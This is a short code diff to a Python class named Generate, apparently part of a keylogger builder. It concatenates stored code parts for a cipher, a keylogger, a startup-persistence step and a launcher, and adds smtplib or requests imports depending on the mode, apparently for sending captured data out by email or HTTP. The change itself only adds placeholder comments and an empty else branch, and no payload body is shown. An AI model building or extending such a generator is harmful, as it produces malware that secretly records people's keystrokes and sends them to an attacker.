@@ -147,12 +147,19 @@ class Generate:
             self.loadModules()
         self.final_code = ""
         self.final_code += self._1_imports
+        
         if self.mode == 1:
+            # ADD VARIABLES HERE
             self.final_code += '\nimport smtplib\n'
         elif self.mode == 3:
+            # ADD VARIABLES HERE
             self.final_code += '\nimport requests\n'
+        else:
+            # ADD VARIABLES HERE
+            pass
         self.final_code += self._2_cipher
         self.final_code += self._3_keylogger
         self.final_code += self._4_startup
         self.final_code += self._5_start
         return self.final_code
+    
